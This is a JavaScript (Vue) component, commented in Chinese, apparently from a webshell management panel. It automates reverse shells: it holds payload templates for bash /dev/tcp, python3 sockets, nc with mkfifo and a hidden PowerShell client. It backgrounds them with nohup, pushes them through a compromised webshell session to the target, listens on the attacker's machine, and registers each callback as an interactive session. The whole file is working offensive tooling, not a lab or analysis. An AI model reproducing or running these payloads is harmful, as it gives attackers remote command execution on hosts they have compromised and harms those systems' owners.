/* ============================================================
   反弹 Shell 模块 — 半自动 / 全自动
   WebShell 伪终端 → 攻击机（面板本机）监听 → 靶机回连 → 登记为交互会话
   ============================================================ */
(function (global) {
  'use strict';
  const { ref, reactive, computed } = Vue;
  const S = PivotStore;

  /* 载荷统一后台执行：WebShell 的 exec 会等命令结束，前台反弹会被挂断/回收 */
  const PAYLOADS = {
    bash: {
      label: 'Linux · bash /dev/tcp',
      cmd: (c) => "nohup bash -c 'bash -i >& /dev/tcp/" + c.ip + '/' + c.port + " 0>&1' >/dev/null 2>&1 &",
    },
    python: {
      label: 'Linux · python3',
      cmd: (c) => "nohup python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + c.ip + '",' + c.port + '));' +
        '[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])\' >/dev/null 2>&1 &',
    },
    nc: {
      label: 'Linux · nc + mkfifo',
      cmd: (c) => "nohup sh -c 'rm -f /tmp/.pf;mkfifo /tmp/.pf;cat /tmp/.pf|/bin/sh -i 2>&1|nc " + c.ip + ' ' + c.port +
        " >/tmp/.pf' >/dev/null 2>&1 &",
    },
    powershell: {
      label: 'Windows · PowerShell',
      cmd: (c) => 'start /b powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient(\'' +
        c.ip + '\',' + c.port + ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
        'while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
        '$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"',
    },
  };

  global.Components['reverse-view'] = {
    name: 'ReverseView',
    template: '#tpl-reverse',
    setup() {
      const ui = S.state.ui;
      const mode = ref('semi');            /* semi | auto */
      const shellId = ref('');
      const bind = ref('');
      const port = ref(4444);
      const kind = ref('bash');
      const running = ref(false);
      const listener = ref(null);
      const listeners = ref([]);
      const log = reactive([]);
      const detected = ref([]);
      let timer = null;
      let registering = false;

      const wsShells = computed(() => S.state.shells.filter((s) => s.kind !== 'reverse'));
      const reverseShells = computed(() => S.state.shells.filter((s) => s.kind === 'reverse'));
      const kinds = Object.keys(PAYLOADS).map((k) => ({ key: k, label: PAYLOADS[k].label }));

      function payload() {
        const t = PAYLOADS[kind.value] || PAYLOADS.bash;
        return t.cmd({ ip: bind.value, port: Number(port.value) || 0 });
      }
      function push(k, text) { log.push({ k, text }); }
      function stopPolling() { if (timer) { clearInterval(timer); timer = null; } }

      function initFromUi() {
        bind.value = (S.state.attack && S.state.attack.ip) || '127.0.0.1';
        const want = ui.revShellId;
        const ids = wsShells.value.map((s) => s.id);
        if (want && ids.indexOf(want) >= 0) shellId.value = want;
        else if (ids.indexOf(shellId.value) < 0) {
          const alive = wsShells.value.find((s) => s.alive);
          shellId.value = (alive || wsShells.value[0] || {}).id || '';
        }
        const s = S.state.shells.find((x) => x.id === shellId.value);
        if (s) kind.value = S.shellPlatform(s) === 'windows' ? 'powershell' : 'bash';
        checkBind();
      }

      /* 监听地址是否仍是本机地址（休眠 / 换网后旧 IP 会失效 → WinError 10049） */
      function checkBind() {
        S.netinfo().then((out) => {
          detected.value = (out && out.ips) || [];
          if (bind.value && bind.value !== '127.0.0.1' &&
              detected.value.length && detected.value.indexOf(bind.value) < 0) {
            push('warn', '⚠ 监听地址 ' + bind.value + ' 已不在本机地址列表中（休眠/换网后可能变了）');
            push('dim', '本机当前地址：' + detected.value.join(' / ') + ' · 可点「使用检测到的地址」');
          }
        });
      }
      function useDetected() {
        if (!detected.value.length) { push('warn', '未检测到非回环地址'); return; }
        bind.value = detected.value[0];
        push('dim', '监听地址改为 ' + bind.value);
      }

      function refreshListeners() {
        return S.reverseListeners().then((out) => {
          listeners.value = (out && out.listeners) || [];
          if (listener.value) {
            const me = listeners.value.find((x) => x.id === listener.value.id);
            if (!me) { listener.value = null; running.value = false; stopPolling(); }
            else listener.value = me;
          }
        });
      }

      function startPolling() {
        if (timer) return;
        timer = setInterval(() => {
          if (!listener.value) return;
          S.reverseListeners().then((out) => {
            listeners.value = (out && out.listeners) || [];
            const me = listeners.value.find((x) => x.id === (listener.value || {}).id);
            if (!me) { push('err', '监听已消失（服务端可能已重启）'); running.value = false; stopPolling(); return; }
            listener.value = me;
            if (me.connected && !registering) register(me);
          });
        }, 1500);
      }

      function register(me) {
        registering = true;
        const target = S.state.shells.find((x) => x.id === shellId.value);
        push('ok', '收到回连 ' + (((me.peer || [])[0]) || '?') + ' → 登记为面板会话…');
        S.reverseRegister({
          listenerId: me.id,
          hostId: target ? target.hostId : '',
          type: '反弹 Shell（' + (PAYLOADS[kind.value] || {}).label + '）',
        }).then((out) => {
          registering = false;
          if (!out || !out.ok) { push('err', '登记失败：' + ((out && out.error) || '未知原因')); return; }
          push('ok', '✓ 已登记会话 ' + out.shell.id + ' · ' + out.shell.url + ' · ' + out.shell.latency + 'ms');
          S.toast('反弹 Shell 回连成功，已登记为面板会话', 'ok');
          running.value = false;
          stopPolling();
          refreshListeners();
        });
      }

      function start() {
        log.length = 0;
        push('dim', (mode.value === 'auto' ? '全自动档' : '半自动档') + ' · 在 ' + bind.value + ':' + port.value + ' 开监听…');
        S.reverseListen({ bind: bind.value, port: port.value, label: shellId.value }).then((out) => {
          if (!out || !out.ok) {
            push('err', '监听失败：' + ((out && out.error) || '未知原因'));
            if (out && out.localIps && out.localIps.length) {
              detected.value = out.localIps;
              push('dim', '本机当前地址：' + out.localIps.join(' / '));
            }
            return;
          }
          listener.value = out.listener;
          running.value = true;
          push('ok', '监听已启动：' + out.listener.bind + ':' + out.listener.port +
            (out.replaced ? '（已替换同端口的残留监听）' : ''));
          refreshListeners();
          startPolling();
          if (mode.value === 'auto') send();
        });
      }

      function send() {
        if (!shellId.value) { push('err', '请先选择在哪个 WebShell 会话里执行'); return; }
        const cmd = payload();
        push('dim', '→ 下发到会话 ' + shellId.value + '：' + cmd);
        S.execOn(shellId.value, cmd).then((out) => {
          const why = out && (out.error || out.reason);
          if (!out || (out.ok === false && why)) {
            push('err', '执行失败：' + (why || '未知原因'));
          } else if (out.ok === false) {
            /* 后台命令（nohup … &）没有回显，HTTP 马驱动会因「无 EOF 标记」判失败——实际已下发 */
            push('warn', '命令已下发（后台执行、无回显属正常）；等待靶机回连…');
          } else {
            push('ok', '命令已下发，等待靶机回连…' +
              (out.output ? ' 回显：' + String(out.output).trim().slice(0, 100) : ''));
          }
        });
      }

      function closeOne(id) {
        S.reverseCloseListener(id).then(() => {
          if (listener.value && listener.value.id === id) {
            listener.value = null; running.value = false; stopPolling();
          }
          refreshListeners();
          push('dim', '已关闭监听 ' + id);
        });
      }
      function closeAll() {
        S.reverseCloseAll().then((out) => {
          listener.value = null; running.value = false; stopPolling();
          refreshListeners();
          push('dim', '已清理 ' + ((out && out.closed) || 0) + ' 个监听');
        });
      }
      function openSession(id) { S.openTerminalById(id); }
      function copyPayload() { S.copy(payload()); }

      initFromUi();
      refreshListeners();

      return {
        ui, mode, shellId, bind, port, kind, running, listener, listeners, log, detected,
        wsShells, reverseShells, kinds, payload,
        start, send, closeOne, closeAll, refreshListeners, useDetected, openSession, copyPayload,
        ipOf: S.ipOf, icon: global.icon,
      };
    },
  };
})(window);
